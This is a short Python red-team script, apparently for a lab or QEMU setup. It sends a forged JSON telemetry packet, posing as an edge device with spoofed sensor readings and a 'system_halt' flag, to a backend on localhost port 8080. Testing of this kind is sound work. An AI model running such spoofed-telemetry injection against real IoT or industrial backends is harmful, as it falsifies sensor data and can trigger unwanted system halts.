# LICENSE UPL
# Author: Mauro Risonho de Paula Assumpção
# Description: Red Team Telemetry Injection Script
import socket
import json
import time

SERVER_IP = "127.0.0.1" # Change to QEMU Host IP if needed
SERVER_PORT = 8080

def inject_telemetry():
    print(f"Simulating Telemetry Injection Attack to Backend ({SERVER_IP}:{SERVER_PORT})...")
    
    # Fake packet appearing to originate from the edge device
    malicious_payload = {
        "device_id": "edge-arm64",
        "temperature": 12.0,
        "vibration": 0.0,
        "current": 0.0,
        "timestamp": int(time.time()),
        "malicious_flag": "system_halt"
    }
    
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((SERVER_IP, SERVER_PORT))
            payload_str = json.dumps(malicious_payload) + "\n"
            s.sendall(payload_str.encode('utf-8'))
            print("Malicious telemetry injected successfully.")
    except ConnectionRefusedError:
        print("Failed to connect to backend server.")

if __name__ == "__main__":
    inject_telemetry()
